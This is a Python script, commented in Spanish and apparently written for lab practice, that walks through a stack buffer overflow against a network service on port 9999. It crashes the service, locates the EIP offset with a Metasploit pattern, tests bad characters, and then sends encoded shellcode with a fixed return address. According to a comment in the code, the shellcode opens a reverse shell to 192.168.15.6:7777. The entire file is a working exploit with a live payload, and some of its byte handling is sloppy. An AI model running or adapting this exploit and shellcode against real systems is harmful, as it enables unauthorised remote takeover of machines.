import socket
import subprocess

ip = '192.168.15.7'
puerto = 9999

def confirmacion(mensaje):
    respuesta = input(mensaje)
    if respuesta == 'n':
        print('[-] Saliendo del programa...')
        return 1

def denegacionServicio(ip, puerto):
    confirmacion("El primer paso consiste en acabar con la ejecución del programa para saber a partir de cuantos bytes deja de funcionar, quieres continuar? (s/n)")

    for bytes in range(1,10):

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, puerto))

        bytes += (bytes)*100-bytes
        print(f'[+] Enviando {bytes} bytes ...')
        payload = 'A'*bytes
        s.send(payload.encode())

        s.close()
    confirmacion("Paso 1 completado, reinicia el programa en el debugger. El siguiente paso es calcular el offset o el byte exacto en el que deja de funcionar el binario, quieres continuar? (s/n)")

def calcularOffset(ip, puerto):
    
    patron = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, puerto))

    s.send(patron.encode())
    print("[+] Patron enviado con éxito, revisa el EIP en el debugger")

    eip = "35724134"
    output = subprocess.run(
        ["/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb", "-l", "1000", "-q", eip],
        capture_output = True,
        text = True
    )

    offset = output.stdout.split()
    print(f"[+] El offset es {offset[-1]}")
    print('[*] Reinicia el programa en el debugger')
    confirmacion("Paso 2 completado, reinicia el programa en el debugger. El siguiente paso es comprobar si podemos sobreescribir el registro EIP, quieres continuar? (s/n)")
    return offset

def sobreescribirEIP(ip, puerto, offset):

    print("[+] Sobrescribiendo EIP. El valor del EIP deberia de ser 42424242")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, puerto))

    payload = 'A' * int(offset) + 'B'* 4
    s.send(payload.encode())
    s.close()
    confirmacion("Paso 3 completado, reinicia el programa en el debugger. El siguiente paso envia los badchars a la aplicación, quieres continuar? (s/n)")

def badChars(ip, puerto, offset):

    caracteresInvalidos = {
    "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
    "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
    "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
    "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
    "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
    "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
    "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
    "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
    "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
    "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
    "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
    "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
    "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
    "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
    "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
    "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
    }
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, puerto))

    payload = 'A' * int(offset) + 'B'* 4 + str(caracteresInvalidos)
    s.send(payload.encode())
    s.close()
    confirmacion("Paso 4 completado, reinicia el debugger. El último paso ya es enviar el shellcode que nos devuelve la shell, para obtener la reverse shell es necesario ponerse a la escucha, quieres continuar? (s/n)")
    
def shell(ip, puerto, offset):
    #ip 192.168.15.6 puerto 7777
    payload = ("\xda\xc7\xd9\x74\x24\xf4\x5f\x33\xc9\xbb\x39\xab\x3e\x7f"
    "\xb1\x52\x83\xef\xfc\x31\x5f\x13\x03\x66\xb8\xdc\x8a\x64"
    "\x56\xa2\x75\x94\xa7\xc3\xfc\x71\x96\xc3\x9b\xf2\x89\xf3"
    "\xe8\x56\x26\x7f\xbc\x42\xbd\x0d\x69\x65\x76\xbb\x4f\x48"
    "\x87\x90\xac\xcb\x0b\xeb\xe0\x2b\x35\x24\xf5\x2a\x72\x59"
    "\xf4\x7e\x2b\x15\xab\x6e\x58\x63\x70\x05\x12\x65\xf0\xfa"
    "\xe3\x84\xd1\xad\x78\xdf\xf1\x4c\xac\x6b\xb8\x56\xb1\x56"
    "\x72\xed\x01\x2c\x85\x27\x58\xcd\x2a\x06\x54\x3c\x32\x4f"
    "\x53\xdf\x41\xb9\xa7\x62\x52\x7e\xd5\xb8\xd7\x64\x7d\x4a"
    "\x4f\x40\x7f\x9f\x16\x03\x73\x54\x5c\x4b\x90\x6b\xb1\xe0"
    "\xac\xe0\x34\x26\x25\xb2\x12\xe2\x6d\x60\x3a\xb3\xcb\xc7"
    "\x43\xa3\xb3\xb8\xe1\xa8\x5e\xac\x9b\xf3\x36\x01\x96\x0b"
    "\xc7\x0d\xa1\x78\xf5\x92\x19\x16\xb5\x5b\x84\xe1\xba\x71"
    "\x70\x7d\x45\x7a\x81\x54\x82\x2e\xd1\xce\x23\x4f\xba\x0e"
    "\xcb\x9a\x6d\x5e\x63\x75\xce\x0e\xc3\x25\xa6\x44\xcc\x1a"
    "\xd6\x67\x06\x33\x7d\x92\xc1\xfc\x2a\x93\x17\x95\x28\xab"
    "\x09\x04\xa4\x4d\x5f\xd6\xe0\xc6\xc8\x4f\xa9\x9c\x69\x8f"
    "\x67\xd9\xaa\x1b\x84\x1e\x64\xec\xe1\x0c\x11\x1c\xbc\x6e"
    "\xb4\x23\x6a\x06\x5a\xb1\xf1\xd6\x15\xaa\xad\x81\x72\x1c"
    "\xa4\x47\x6f\x07\x1e\x75\x72\xd1\x59\x3d\xa9\x22\x67\xbc"
    "\x3c\x1e\x43\xae\xf8\x9f\xcf\x9a\x54\xf6\x99\x74\x13\xa0"
    "\x6b\x2e\xcd\x1f\x22\xa6\x88\x53\xf5\xb0\x94\xb9\x83\x5c"
    "\x24\x14\xd2\x63\x89\xf0\xd2\x1c\xf7\x60\x1c\xf7\xb3\x81"
    "\xff\xdd\xc9\x29\xa6\xb4\x73\x34\x59\x63\xb7\x41\xda\x81"
    "\x48\xb6\xc2\xe0\x4d\xf2\x44\x19\x3c\x6b\x21\x1d\x93\x8c"
    "\x60")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, puerto))
    retn = "\xf3\x12\x17\x31"
    payload = 'A' * int(offset) + retn + '\x90' * 16 + str(payload)
    s.send((payload + "\r\n").encode("latin-1"))

def menu():
    print("Elige una de los opciones\n\r1) Explotación paso a paso con Immunity Debugger\n\r2) Establecer reverse shell\n\n\r0) Salir")
    eleccion = int(input("> "))
    return eleccion

def main():
    eleccion = menu()

    if(eleccion == 1):
        denegacionServicio(ip, puerto)
        offset = calcularOffset(ip, puerto)
        offset = offset[-1]
        sobreescribirEIP(ip, puerto, offset)
        badChars(ip, puerto, offset)
        shell(ip, puerto, offset)

    elif(eleccion == 2):
        shell(ip, puerto, 524)

    else:
        print("[-] Opción no válida, saliendo del programa...")


main()